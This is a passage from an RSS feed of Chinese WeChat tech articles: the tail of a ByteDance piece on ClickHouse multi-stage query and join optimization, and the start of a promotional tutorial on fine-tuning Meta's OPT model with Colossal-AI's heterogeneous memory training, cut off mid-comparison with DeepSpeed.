shuffle后可以由多个节点并行完成。&lt;/span&gt;&lt;span&gt;因此通过shuffle减轻了coordinator的 merge agg 压力。&lt;/span&gt;&lt;br/&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIuTePcHsqSelmXylBWr0zbZ2HsWs8Bib6lZaoEM7Gyp9Z8n3niab0oFM7A/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;Case2——右表为大表。&lt;/span&gt;&lt;/strong&gt;&lt;span/&gt;&lt;span&gt;由于 &lt;/span&gt;&lt;span&gt;ClickHouse&lt;/span&gt;&lt;span&gt; 对多表的优化做的还不是很到位。&lt;/span&gt;&lt;span&gt;这里采用子查询来下推过滤的条件。&lt;/span&gt;&lt;span&gt;在这个case中，Lineorder是一张大表，采用复杂查询的模式以后，Query执行时间从17秒优化到了1.7秒。&lt;/span&gt;&lt;span&gt;由于Lineorder是一张大表，通过Shuffle可以将数据按照Join key&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;Shuffle到各Worker节点上，这样就减少了右表构建的压力。&lt;/span&gt;&lt;br/&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIu7j09p4ez8UITeVLPbSCTCwibZwU7407qKfbibo5G4tVnAEWf5FODNS3Q/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;Case3——多表Join。&lt;/span&gt;&lt;/strong&gt;&lt;span/&gt;&lt;span&gt;开启复杂查询后，Query的执行时间从8.58秒优化到4.464秒，所有的右表都可以同时开始数据的处理和构建。&lt;/span&gt;&lt;span&gt;为了和现有模式做对比，复杂查询这里并没有开启 runtime filter，开启 runtime filter 后效果会更&lt;/span&gt;&lt;span&gt;好&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIuoNedsibJtZzG7AF4n3mBd9MykULqwrO0bwCFAhcRqrz8LU0ESibH8r6Q/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;事实上，优化器对复杂查询的性能提升也非常大，通过一些RBO的规则，例如常见的谓词下推、相关子查询的处理等&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;可以极大提升&lt;/span&gt;&lt;span&gt;SQL&lt;/span&gt;&lt;span&gt;的执行效率。&lt;/span&gt;&lt;span&gt;在复杂查询的模式下，由于有&lt;/span&gt;&lt;span&gt;优化器&lt;/span&gt;&lt;span&gt;的存在，用户甚至不需要写得非常复杂，优化器自动去完成这些下推和RBO规则优化。&lt;/span&gt;&lt;br/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;此外，选择用哪一种Join的实现，也会对Join的性能影响较大。若能够满足Join Key分布，使用Colocate Join可以减少左右表Shuffle的传输代价。在多表Join的情况下，Join的顺序和Join的实现方式对执行的时长影响，会比两表Join更大。借助这种数据的统计信息，通过一些CBO的优化，可以得到一个比较好的执行模式。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;有了优化器，业务同学可以按照业务逻辑来写任何的 SQL，引擎自动计算出相对最优的 SQL 计划并执行，加速查询的执行。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;总结一下，ClickHouse目前的执行模式在很多单表的场景下表现非常优异，我们主要针对复杂场景做优化，&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;通过实现多Stage的模式，实现了Stage之间的数据的传输，从工程实践上做了较多尝试和优化，去提升执行和网络传输的性能。并希望通过完善Metrics和智能诊断来降低SQL分析和调优的门槛。目前已经实现了第一步，未来字节仍有很多努力的方向。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;首先，是要继续去提升执行和Exchange的性能。&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;这里不谈论引擎执行通用的优化，比如更好的索引或者算子的优化，主要是跟复杂查询模式有关。举一个例子，比如 Stage 复用，在 SQL 出现子查询结果被反复使用的场景，比如一些多表 join 和 CTE 场景可能有帮助。通过 Stage 复用可以减少相同数据的多次读取。Stage 复用我们之前就已经支持，但是用的场景比较少，未来准备更灵活和通用。&lt;strong&gt;其次，Metrics和智能诊断加强。&lt;/strong&gt;SQL的灵活度很高，因此一些复杂查询如果没有Metrics其实几乎很难去做诊断和调优。以上都是字节跳动数据平台在未来会长期的持续去发力的方向。&lt;/span&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;关注字节跳动数据平台微信公众号，&lt;/span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;回复【0711】获得本次分享材料。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;span&gt;&lt;p&gt;&lt;span&gt;产品介绍&lt;/span&gt;&lt;/p&gt;&lt;/span&gt;&lt;/section&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;section mpa-from-tpl=&quot;t&quot;&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;火山引擎ByteHouse&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;统一的大数据分析平台。目前提供企业版和云数仓两种版本，企业版是基于开源的企业级分析型数据库，支持用户交互式分析&lt;span lang=&quot;EN-US&quot;&gt;PB&lt;/span&gt;级别数据，通过多种自研表引擎，灵活支持各类数据分析和应用；云数仓版作为云原生的数据分析平台，实现统一的离线和实时数据分析，并通过弹性扩展的计算层和分布式存储层，有效降低&lt;/span&gt;&lt;span&gt;企业大数据分析。&lt;strong&gt;后台回复数字“6”了解产品。&lt;/strong&gt;&lt;/span&gt;&lt;span/&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;span&gt;‍&lt;/span&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.035&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/RFOccUKcsRfYb7MADoD4hX4vFicBcNZoU8ovswJKFicDMXYSnNP1ibtn3ibaNicmuGlUodFI8ibAVoIdSJ2ccRKgyp5g/640?wx_fmt=png&quot; data-w=&quot;400&quot;/&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;p data-mid=&quot;&quot;&gt;&lt;span&gt;&lt;strong&gt;活动推荐&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p data-mid=&quot;&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;7月14日19：30，《如何打造企业高速增长飞轮？深度解读三大数字营销工具》&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p data-mid=&quot;&quot;&gt;&lt;span&gt;聚焦“数字化营销增长”话题，邀请火山引擎数据产品相关专家，&lt;/span&gt;&lt;span&gt;&lt;strong&gt;以汽车行业为例，解读三大经典数据工具BI、CDP、MA在企业内部如何高效耦合，&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;带来可复制的营销增长经验，观看直播还可领取免费BI视频课程以及充电宝等精美礼品~&lt;/span&gt;&lt;span&gt;&lt;strong&gt;扫码立即报名👇&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.994579945799458&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r39pjr1TazcJwLth8m4zicZHQL6ueFxt2RjHJBlUEFRDNqkic8gO0b5WkxkxM3gJj80Lzzdd0N7fQAg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;738&quot;/&gt;&lt;/p&gt;&lt;p data-mid=&quot;&quot;&gt;&lt;span/&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;br/&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.035&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/8GbHk6zNbA7ZTsrxmakzwpK8Gdqib9rVft8Kw8ibibqHvlPbvp7GSHmJkKUEdBHycciaLW0M2ZrSiaBeSjiaCsdsEIoQ/640?wx_fmt=png&quot; data-w=&quot;400&quot;/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;
          &lt;/div&gt;

          

          



           
                                
                    
        &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>788abeed720606fc0e401f373bb113a7</guid>
<title>国内竟然也有这种级别的开源项目？万万没想到！</title>
<link>https://toutiao.io/k/dgo2iwb</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content                                       &quot; id=&quot;js_content&quot;&gt;
            &lt;p class=&quot;js_darkmode__1&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;span&gt;公众号关注 “GitCube”&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;设为 “&lt;/span&gt;&lt;span&gt;星标&lt;/span&gt;&lt;span&gt;”，每天带你逛 GitHub！&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;316&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.4716666666666667&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28hbMDupRt8Y7lJvWy3b3vGMAqicJpkfh5HIJYcibbQr3GSgib2kv3mwrGG9SFA5eibYTyhuHo60Zianm6Q/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; data-type=&quot;jpeg&quot; data-w=&quot;1200&quot;/&gt;&lt;/p&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;大家好，我是小 G。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;最近两年，大模型已成为 AI 圈的一种潮流，不仅横扫各大性能榜单，更产生了诸多有趣应用。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;例如，微软和 OpenAI 开发的自动代码建议补全神器 Copilot，化身程序员最佳助手，提升工作效率。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;556&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;293&quot; data-ratio=&quot;0.5256147540983607&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_gif/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObPN9UVXhhW72ibKAlHlz5JCIAxKe30qxAJy8BsmcMplVKPXtMSBtIia7A/640?wx_fmt=gif&quot; data-w=&quot;976&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;OpenAI 刚刚发布能以假乱真的文本生成图像模型 DALL-E 2，Google 便紧接着发布了 Imagen，在大模型上，大公司也是相当的卷，丝毫不比 CV 刷榜差。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;279&quot; data-ratio=&quot;0.49850746268656715&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObJmcNMe2ZNmnEA6HOG98uWNr1x1DFJEWhATHpdXhH0MwyHxEPOXCYXQ/640?wx_fmt=png&quot; data-w=&quot;2680&quot;/&gt;&lt;span&gt;&lt;em&gt;&lt;span&gt;文本到图像生成样例 “一个被猫绊倒的希腊人雕像”（左侧两列为 Imagen，右侧两列为 DALL・E 2）&lt;/span&gt;&lt;/em&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;模型增大带来的神奇表现，使得近几年预训练模型规模呈现爆炸式增长。然而，训练甚至微调大模型都需要非常高的硬件成本，动辄几十、上百张 GPU。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;此外，PyTorch、TensorFlow 等现有深度学习框架也难以有效处理超大模型，通常需要专业的 AI 系统工程师做针对具体模型做适配和优化。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;更重要的是，不是每一个实验室以及研发团队都具备 “钞” 能力，能够随时调用大规模 GPU 集群来使用大模型，更不用提仅有一张显卡的个人开发者。因此，尽管大模型已经吸引了大量关注，高昂的上手门槛却令大众 “望尘莫及”。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;333&quot; data-ratio=&quot;0.595069107209563&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObBNOoqAIayEFxE32hqA61REWEmLownrQCxL7Rf3et88yxAla1hm535A/640?wx_fmt=png&quot; data-w=&quot;2677&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;导致大模型使用成本增高的核心原因是显存限制。GPU 计算虽快，但显存容量有限，无法容纳大模型。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在前不久的文章《&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzAxOTcxNTIwNQ==&amp;amp;mid=2457973991&amp;amp;idx=1&amp;amp;sn=6f3cc4df50102f799cc6ae5d449de20a&amp;amp;chksm=8cb7d10dbbc0581ba6978eb32e0623c1cddffecf55aea191903527ac067fa2cfc686fd0434f7&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;国人主导的开源项目，斩获 3700 个 GitHub Star！&quot; linktype=&quot;text&quot; imgurl=&quot;&quot; imgdata=&quot;null&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;国人主导的开源项目，斩获 3700 个 GitHub Star！&lt;/a&gt;》中，我们介绍了 Colossal-AI 最新研发的异构内存系统，它能够高效地同时使用 GPU 显存以及价格低廉的 CPU 内存，&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;可提升模型容量十余倍，以低成本高效训练 AI 大模型，兼容目前主流的训练任务和优化加速技术，还能便捷扩展至大规模分布式&lt;/span&gt;&lt;/strong&gt;。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Hugging Face 为深度学习社区提供了超过 5 万个 AI 模型的实现，最其中也不乏像 GPT, OPT 这样的大模型，现已成为最流行的 AI 库之一。&lt;/span&gt;&lt;/section&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.41030042918454934&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4Ob4gh8qfhrJFqv3tibh5amIJRIgRh8wgP5n74xZxFysw97f2rO1H1dZGQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1165&quot;/&gt;&lt;/p&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Colossal-AI 无缝支持 Hugging Face 社区模型，让大模型对每一位开发者都变得触手可及。接下来，我们将以 Meta 发布的大模型 OPT 为例，展现如何使用 Colossal-AI，&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;仅需添加几行代码，便可实现大模型的低成本训练和微调。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;开源地址：&lt;/span&gt;&lt;span&gt;&lt;em&gt;&lt;span md-inline=&quot;url&quot; spellcheck=&quot;false&quot;&gt;https://github.com/hpcaitech/ColossalAI&lt;/span&gt;&lt;/em&gt;&lt;/span&gt;&lt;/section&gt;&lt;h3 cid=&quot;n157&quot; mdtype=&quot;heading&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;低成本加速大模型 OPT&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;&lt;span md-inline=&quot;strong&quot;&gt;&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;OPT 模型&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;OPT 的全称为 Open Pretrained Transformer，是 Meta (Facebook) AI 实验室发布的对标 GPT-3 的大规模 Transformer 模型。与 OpenAI 尚未公开模型权重的 GPT-3 相比，Meta AI 慷慨地开源了所有的代码以及模型权重，极大推动了 AI 大模型的民主化，每一位开发者都能以此为基础开发个性化的下游任务。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;接下来，我们将用 Hugging Face 提供的 OPT 模型的预训练权重进行 Casual Language Modelling 的微调。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;strong&quot;&gt;&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;添加配置文件&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;想要使用 Colossal-AI 中各个强大功能，用户&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;无需更改代码训练逻辑，只用添加一个简单的配置文件，即可赋予模型所期望的功能&lt;/span&gt;&lt;/strong&gt;，比如混合精度、梯度累积、多维并行训练、冗余内存优化等。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在一张 GPU 上，以异构训练为例，我们只需在配置文件里加上相关配置项。其中 tensor_placement_policy 决定了我们异构训练的策略，这个参数可以为 cuda、cpu 以及 auto。各个策略有不同的优点：&lt;/span&gt;&lt;/section&gt;&lt;ul class=&quot;list-paddingleft-1&quot; cid=&quot;n163&quot; mdtype=&quot;list&quot; data-mark=&quot;-&quot;&gt;&lt;li&gt;&lt;p cid=&quot;n227&quot; mdtype=&quot;paragraph&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;cuda: 将全部模型参数都放置于 GPU 上，适合不 offload 时仍然能进行训练的传统场景；&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n229&quot; mdtype=&quot;paragraph&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;cpu 则会将模型参数都放置在 CPU 内存中，仅在 GPU 显存中保留当前参与计算的权重，适合超大模型的训练；&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n231&quot; mdtype=&quot;paragraph&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;auto 则会根据实时的内存信息，自动决定保留在 GPU 显存中的参数量，这样能最大化利用 GPU 显存，同时减少 CPU-GPU 之间的数据传输。&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;对于一般用户而言，&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;仅需选择 auto 策略，由 Colossal-AI 自动化地实时动态选择最佳异构策略，最大化计算效率。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n167&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;from&lt;/span&gt; &lt;span&gt;colossalai&lt;/span&gt;.&lt;span&gt;zero&lt;/span&gt;.&lt;span&gt;shard_utils&lt;/span&gt; &lt;span&gt;import&lt;/span&gt; &lt;span&gt;TensorShardStrategy&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;/&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;zero&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;dict&lt;/span&gt;(&lt;span&gt;model_config&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;dict&lt;/span&gt;(&lt;span&gt;shard_strategy&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;TensorShardStrategy&lt;/span&gt;(),&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                             &lt;span&gt;tensor_placement_policy&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&quot;auto&quot;&lt;/span&gt;),&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;           &lt;span&gt;optimizer_config&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;dict&lt;/span&gt;(&lt;span&gt;gpu_margin_mem_ratio&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;0.8&lt;/span&gt;))&lt;/span&gt;&lt;/pre&gt;&lt;section&gt;&lt;span md-inline=&quot;strong&quot;&gt;&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;运行启动&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在配置文件准备好之后，我们&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;只需插入几行代码即可启动声明的新功能&lt;/span&gt;&lt;/strong&gt;。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;首先，通过一行代码，使用配置文件启动 Colossal-AI，Colossal-AI 会自动初始化分布式环境，并读取相关配置，之后将配置里的功能自动注入到模型以及优化器等组件中。&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; cid=&quot;n208&quot; mdtype=&quot;fences&quot;&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n208&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;colossalai&lt;/span&gt;.&lt;span&gt;launch_from_torch&lt;/span&gt;(&lt;span&gt;config&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&#x27;./configs/colossalai_zero.py&#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/pre&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;接下来，用户可以照常定义数据集、模型、优化器、损失函数等，例如直接使用原生 PyTorch 代码。在定义模型时，只需将模型放置于 ZeroInitContext 下初始化即可。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在例子里，我们使用 Hugging Face 提供的 OPTForCausalLM 模型以及预训练权重，在 Wikitext 数据集上进行微调。&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n215&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;with&lt;/span&gt; &lt;span&gt;ZeroInitContext&lt;/span&gt;(&lt;span&gt;target_device&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;torch&lt;/span&gt;.&lt;span&gt;cuda&lt;/span&gt;.&lt;span&gt;current_device&lt;/span&gt;(),&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                   &lt;span&gt;shard_strategy&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;shard_strategy&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                   &lt;span&gt;shard_param&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;True&lt;/span&gt;):&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;   &lt;span&gt;model&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;OPTForCausalLM&lt;/span&gt;.&lt;span&gt;from_pretrained&lt;/span&gt;(&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;               &lt;span&gt;&#x27;facebook/opt-1.3b&#x27;&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;               &lt;span&gt;config&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;config&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;          )&lt;/span&gt;&lt;/pre&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;接着，只需要调用 colossalai.initialize，便可将配置文件里定义的异构内存功能统一注入到训练引擎中，即可启动相应功能。&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n219&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;engine&lt;/span&gt;, &lt;span&gt;train_dataloader&lt;/span&gt;, &lt;span&gt;eval_dataloader&lt;/span&gt;, &lt;span&gt;lr_scheduler&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;colossalai&lt;/span&gt;.&lt;span&gt;initialize&lt;/span&gt;(&lt;span&gt;model&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;model&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;optimizer&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;optimizer&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;criterion&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;criterion&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;train_dataloader&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;train_dataloader&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;test_dataloader&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;eval_dataloader&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;                                                                              &lt;span&gt;lr_scheduler&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;lr_scheduler&lt;/span&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;h3 cid=&quot;n176&quot; mdtype=&quot;heading&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;优势显著&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在单张 GPU，与微软 DeepSpeed 相比，Colossal-AI 的使用自动化的 auto 策略，在不同的模型规模上相比 DeepSpeed 的 ZeRO Offloading 策略，均体现出显著优势，&lt;strong&gt;&lt;span 